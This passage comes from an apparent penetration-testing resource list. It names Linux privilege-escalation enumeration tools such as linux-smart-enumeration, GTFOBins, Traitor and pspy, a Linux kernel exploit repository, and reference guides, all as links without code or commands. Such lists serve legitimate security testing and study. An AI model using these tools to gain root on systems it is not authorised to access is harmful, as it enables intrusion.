[5] PostEnum -> https://github.com/mostaphabahadou/postenum
[6] linuxprivcheck -> https://github.com/cervoise/linuxprivcheck
[7] linux-smart-enumeration -> https://github.com/diego-treitos/linux-smart-enumeration/
[8] linux-soft-exploit-suggester -> https://github.com/belane/linux-soft-exploit-suggester
[9] Uptux -> https://github.com/initstring/uptux
[10] GTFO -> https://gtfobins.github.io/ && https://github.com/t0thkr1s/gtfo
[11] GTFOBlookup -> https://github.com/nccgroup/GTFOBLookup
[12] SUID3NUM -> https://github.com/Anon-Exploiter/SUID3NUM
[13] Traitor -> https://github.com/liamg/traitor
[14] BeRoot -> https://github.com/AlessandroZ/BeRoot
[15] AutoLocalPrivilegeEscalation -> https://github.com/ngalongc/AutoLocalPrivilegeEscalation
[16] PSPY -> https://github.com/DominicBreuker/pspy
[17] Basic-Linux-Privilege-Escalation -> https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
[18] Awesome-privilege-escalation -> https://github.com/m0nad/awesome-privilege-escalation

Exploits:
[1] Linux-Kernel-Exploits -> https://github.com/SecWiki/linux-kernel-exploits

References:
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
https://www.hackingarticles.in/linux-privilege-escalation-automated-script/
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
https://payatu.com/guide-linux-privilege-escalation
https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_-_linux.html
